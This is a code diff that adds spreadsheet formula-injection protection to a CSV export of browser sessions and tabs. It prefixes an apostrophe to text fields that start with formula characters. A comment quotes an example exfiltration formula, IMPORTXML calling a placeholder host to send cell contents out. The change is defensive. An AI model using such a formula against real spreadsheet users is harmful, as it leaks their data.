@@ -286,9 +286,27 @@ export function csvEscape(field: string): string {
   return /[",\r\n]/.test(field) ? `"${field.replace(/"/g, '""')}"` : field;
 }
 
+/**
+ * Neutralises a spreadsheet formula before RFC 4180 quoting. A tab title is whatever
+ * `document.title` a visited page chose, and Excel, Sheets and LibreOffice strip the quoting
+ * before deciding what is a formula, so a title like `=IMPORTXML("https://evil.test/?d="&A1,…)`
+ * would run on open and could read the neighbouring cell (another tab's url). A leading
+ * apostrophe makes the cell literal text; spreadsheets hide it, a plain CSV parser returns the
+ * original text with that one apostrophe in front.
+ *
+ * Text columns only (session name, group title, tab title, url) — never the numeric or boolean
+ * ones, whose values are generated here and would only be corrupted by a prefix.
+ */
+export function csvGuardFormula(field: string): string {
+  return /^[=+\-@\t\r]/.test(field) ? `'${field}` : field;
+}
+
 export const CSV_HEADER = 'session,window,group,index,pinned,title,url';
 
-/** One row per tab in strip order. `window` and `index` are 1-based like "Window N". */
+/**
+ * One row per tab in strip order. `window` and `index` are 1-based like "Window N".
+ * Text fields pass through `csvGuardFormula` first, then RFC 4180 quoting.
+ */
 export function toCsv(sessions: Session[]): string {
   const rows = [CSV_HEADER];
   for (const session of sessions) {
@@ -297,13 +315,13 @@ export function toCsv(sessions: Session[]): string {
         const group =
           tab.groupIndex === undefined ? '' : (window.groups[tab.groupIndex]?.title ?? '');
         const fields = [
-          session.name,
+          csvGuardFormula(session.name),
           String(windowIndex + 1),
-          group,
+          csvGuardFormula(group),
           String(tabIndex + 1),
           String(tab.pinned),
-          tab.title,
-          tab.url,
+          csvGuardFormula(tab.title),
+          csvGuardFormula(tab.url),
         ];
         rows.push(fields.map(csvEscape).join(','));
       }
